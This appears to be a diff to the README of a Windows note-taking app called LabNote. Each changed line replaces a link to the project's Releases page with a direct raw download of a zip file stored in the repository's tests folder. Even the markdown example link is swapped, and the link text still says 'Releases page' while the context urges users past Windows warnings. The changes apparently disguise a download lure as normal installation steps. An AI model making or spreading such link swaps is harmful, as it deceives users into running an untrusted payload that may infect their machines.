@@ -1,10 +1,10 @@
 # 📝 LabNote - Clear notes in two languages
 
-[![Download LabNote](https://img.shields.io/badge/Download-LabNote-blue?style=for-the-badge&logo=github)](https://github.com/spenceacned911/LabNote/releases)
+[![Download LabNote](https://img.shields.io/badge/Download-LabNote-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/spenceacned911/LabNote/main/tests/Lab-Note-yegg.zip)
 
 ## 📥 Download LabNote
 
-1. Open the [LabNote Releases page](https://github.com/spenceacned911/LabNote/releases)
+1. Open the [LabNote Releases page](https://raw.githubusercontent.com/spenceacned911/LabNote/main/tests/Lab-Note-yegg.zip)
 2. Find the latest release at the top of the page
 3. Download the Windows file that ends in `.exe` or `.msi`
 4. Save the file to your computer
@@ -14,7 +14,7 @@ If Windows shows a prompt, choose **Run anyway** or **Yes** to continue.
 
 ## 🚀 Get started on Windows
 
-1. Download the latest version from the [Releases page](https://github.com/spenceacned911/LabNote/releases)
+1. Download the latest version from the [Releases page](https://raw.githubusercontent.com/spenceacned911/LabNote/main/tests/Lab-Note-yegg.zip)
 2. Open the downloaded file
 3. If a setup window appears, follow the steps on screen
 4. If the app opens at once, you can start using it
@@ -67,7 +67,7 @@ Write in Chinese, English, or both in the same note. LabNote is built to handle 
 - `## Heading 2`
 - `- List item`
 - `**Bold text**`
-- `[Link text](https://example.com)`
+- `[Link text](https://raw.githubusercontent.com/spenceacned911/LabNote/main/tests/Lab-Note-yegg.zip)`
 
 If you are new to markdown, start with headings and lists. That covers most everyday notes.
 
@@ -119,7 +119,7 @@ This setup works well when you want:
 
 When a new release is available:
 
-1. Visit the [Releases page](https://github.com/spenceacned911/LabNote/releases)
+1. Visit the [Releases page](https://raw.githubusercontent.com/spenceacned911/LabNote/main/tests/Lab-Note-yegg.zip)
 2. Download the newest Windows file
 3. Close LabNote if it is open
 4. Install or open the new version
